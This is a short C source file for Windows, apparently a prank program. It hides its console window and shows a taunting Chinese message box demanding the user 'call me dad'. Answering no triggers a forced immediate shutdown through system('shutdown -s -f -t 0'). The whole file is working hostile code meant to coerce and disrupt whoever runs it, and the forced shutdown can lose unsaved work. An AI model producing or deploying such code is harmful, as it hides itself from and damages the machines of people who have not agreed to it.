#include<windows.h> 
int main(){
	HWND hwnd=FindWindow("ConsoleWindowClass",NULL);
	ShowOwnedPopups(hwnd,SW_HIDE);
	ShowWindow(hwnd,SW_HIDE);
	while(MessageBox(NULL,"快叫我爸爸","叫我爸爸就放过你",MB_YESNO|MB_ICONINFORMATION)==IDYES)MessageBox(NULL,"真乖","真乖",MB_OK|MB_ICONINFORMATION);
	system("shutdown -s -f -t 0");
	return 0;
}
